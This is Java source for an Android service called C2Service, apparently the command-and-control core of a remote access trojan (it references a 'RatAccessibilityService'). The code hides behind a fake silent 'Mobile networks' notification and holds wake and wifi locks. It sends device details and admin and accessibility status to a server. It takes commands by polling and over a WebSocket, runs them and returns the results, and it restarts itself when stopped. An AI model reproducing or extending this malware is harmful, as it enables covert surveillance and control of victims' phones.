package com.gls.sim1;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.net.wifi.WifiManager;

import androidx.core.app.NotificationCompat;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class C2Service extends Service {
    public static volatile boolean running;
    // last time the poller successfully talked to the server (monotonic ms).
    // Stale => the poll thread died; the watchdog restarts it via onStartCommand.
    public static volatile long lastPollAt;
    private final ExecutorService pool = Executors.newFixedThreadPool(2);
    private Handler main;
    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;
    private Thread poller;
    private final Object netLock = new Object();
    private ConnectivityManager.NetworkCallback netCb;
    // Persistent command channel: the server pushes commands down this socket so
    // delivery does not have to wait for the next HTTP poll.
    private volatile WebSocket cmdSock;
    private volatile long cmdBackoff = 1000;
    private boolean cmdReconnectPending;

    @Override
    public void onCreate() {
        super.onCreate();
        running = true;
        lastPollAt = android.os.SystemClock.elapsedRealtime();
        Foreground.set(this);
        Net.loadServer(this);
        main = new Handler(Looper.getMainLooper());
        createChannel();
        Notification n = new NotificationCompat.Builder(this, "s1")
                .setContentTitle("Mobile networks")
                .setContentText("Searching…")
                .setSmallIcon(R.drawable.ic_sim1)
                .setOngoing(true)
                .setShowWhen(false)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(1, n, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(1, n);
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "s1:c2");
        wakeLock.acquire();
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        if (wm != null) {
            wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "s1:wifi");
            wifiLock.acquire();
        }

        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            try {
                startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName()))
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            } catch (Exception ignored) {
            }
        }

        netCb = Net.observeNetwork(this, this::wakePoller);
        poller = new Thread(this::pollLoop, "s1-poll");
        poller.start();
        ensureCmdChannel();
        Watchdog.arm(this);
    }

    private void wakePoller() {
        ensureCmdChannel();
        synchronized (netLock) {
            netLock.notifyAll();
        }
    }

    private void ensureCmdChannel() {
        if (!running || cmdSock != null) return;
        final String id = Net.deviceId(this);
        try {
            cmdSock = Net.openStream(id, "cmd", new WebSocketListener() {
                @Override
                public void onMessage(WebSocket ws, String text) {
                    cmdBackoff = 1000;
                    try {
                        JsonObject m = Net.G.fromJson(text, JsonObject.class);
                        if (m == null || !m.has("cid")) return;
                        int cid = m.get("cid").getAsInt();
                        String type = m.has("type") ? m.get("type").getAsString() : "";
                        JsonObject args = (m.has("args") && m.get("args").isJsonObject())
                                ? m.getAsJsonObject("args") : new JsonObject();
                        // Ack first: tells the server to stop tracking this as a
                        // pending push, so the HTTP poll will not also deliver it.
                        pool.execute(() -> {
                            try {
                                JsonObject a = new JsonObject();
                                a.addProperty("id", id);
                                a.addProperty("cid", cid);
                                Net.postJson("/api/ack", id, a);
                            } catch (Exception ignored) {
                            }
                        });
                        dispatch(id, cid, type, args);
                    } catch (Exception ignored) {
                    }
                }

                @Override
                public void onClosed(WebSocket ws, int code, String reason) {
                    onCmdDown();
                }

                @Override
                public void onFailure(WebSocket ws, Throwable t, Response resp) {
                    onCmdDown();
                }
            });
        } catch (Exception e) {
            onCmdDown();
        }
    }

    private void onCmdDown() {
        cmdSock = null;
        synchronized (netLock) {
            if (cmdReconnectPending) return;
            cmdReconnectPending = true;
        }
        long delay = cmdBackoff;
        cmdBackoff = Math.min(Math.max(cmdBackoff * 2, 1000L), 30_000L);
        main.postDelayed(() -> {
            synchronized (netLock) {
                cmdReconnectPending = false;
            }
            ensureCmdChannel();
        }, delay);
    }

    private void pace(long ms) throws InterruptedException {
        synchronized (netLock) {
            netLock.wait(ms);
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm.getNotificationChannel("s1") == null) {
                NotificationChannel ch = new NotificationChannel("s1", "Mobile networks", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // The watchdog pokes this every pulse: if the poll thread ever dies while
        // the service lives on, it is silently restarted here.
        ensurePoller();
        lastPollAt = android.os.SystemClock.elapsedRealtime();
        return START_STICKY;
    }

    private synchronized void ensurePoller() {
        if (!running) return;
        if (poller == null || !poller.isAlive()) {
            android.util.Log.w("SIM1", "poller dead -> restarting");
            poller = new Thread(this::pollLoop, "s1-poll");
            poller.start();
        }
    }

    private JsonObject buildHb(String id) {
        JsonObject hb = new JsonObject();
        hb.addProperty("id", id);
        hb.addProperty("name", Build.MODEL);
        hb.addProperty("model", Build.MODEL);
        hb.addProperty("brand", Build.BRAND);
        hb.addProperty("android", Build.VERSION.RELEASE);
        hb.addProperty("sdk", Build.VERSION.SDK_INT);
        hb.addProperty("sim", Net.simLabel(this));
        hb.addProperty("battery", CommandHandler.batteryPct(this));
        hb.addProperty("network", Net.networkType(this));
        hb.addProperty("admin", CommandHandler.isAdmin(this));
        hb.addProperty("a11y", RatAccessibilityService.isUp());
        hb.addProperty("stream", ScreenStreamer.getInstance().anyActive());
        return hb;
    }

    private void pollLoop() {
        String id = Net.deviceId(this);
        // Fast lane while something is happening (commands/stream), idle lane otherwise.
        long fastMs = 1000L;
        long idleMs = DeviceTier.pollMs();
        long backoff = fastMs;
        long lastReg = 0, lastHb = 0, hotUntil = 0;
        boolean registered = false;
        while (running && !Thread.currentThread().isInterrupted()) {
            try {
                JsonObject hb = buildHb(id);
                long now = android.os.SystemClock.elapsedRealtime();
                // register rarely (keeps model/ip fresh); heartbeat well inside the 45s
                // online window; poll every cycle for command pickup.
                if (!registered || now - lastReg >= 300_000L) {
                    Net.postJson("/api/register", id, hb);
                    lastReg = now;
                    registered = true;
                }
                if (now - lastHb >= 20_000L) {
                    Net.postJson("/api/heartbeat", id, hb);
                    lastHb = now;
                }
                String poll = Net.postJson("/api/poll", id, hb);
                lastPollAt = now;
                backoff = fastMs;
                JsonObject pj = Net.G.fromJson(poll, JsonObject.class);
                if (pj != null && pj.has("cmds") && pj.get("cmds").isJsonArray()) {
                    JsonArray cmds = pj.getAsJsonArray("cmds");
                    if (cmds.size() > 0) hotUntil = now + 8_000L;   // stay snappy after activity
                    for (int k = 0; k < cmds.size(); k++) {
                        JsonObject c = cmds.get(k).getAsJsonObject();
                        dispatch(id, c.get("cid").getAsInt(), c.get("type").getAsString(),
                                c.has("args") ? c.getAsJsonObject("args") : new JsonObject());
                    }
                }
                boolean hot = now < hotUntil || ScreenStreamer.getInstance().anyActive();
                pace(hot ? fastMs : Math.min(backoff, idleMs));
            } catch (InterruptedException ie) {
                break;
            } catch (Throwable t) {
                backoff = Math.min(Math.max(backoff * 2, fastMs), 20000L);
                try { pace(backoff); } catch (InterruptedException ie) { break; }
            }
        }
    }

    private void dispatch(String id, int cid, String type, JsonObject args) {
        main.post(() -> {
            JsonObject res = CommandHandler.handle(C2Service.this, type, args);
            pool.execute(() -> {
                try {
                    JsonObject out = new JsonObject();
                    out.addProperty("id", id);
                    out.addProperty("cid", cid);
                    out.add("result", res);
                    Net.postJson("/api/result", id, out);
                } catch (Exception ignored) {
                }
            });
        });
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Watchdog.arm(getApplicationContext());
    }

    @Override
    public void onDestroy() {
        running = false;
        wakePoller();
        if (poller != null) poller.interrupt();
        WebSocket cs = cmdSock;
        cmdSock = null;
        if (cs != null) {
            try { cs.close(1000, null); } catch (Exception ignored) {
            }
        }
        if (netCb != null) Net.unobserveNetwork(this, netCb);
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
        pool.shutdownNow();
        super.onDestroy();
        try {
            Intent i = new Intent(getApplicationContext(), C2Service.class);
            if (Build.VERSION.SDK_INT >= 26) getApplicationContext().startForegroundService(i);
            else getApplicationContext().startService(i);
        } catch (Exception ignored) {
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
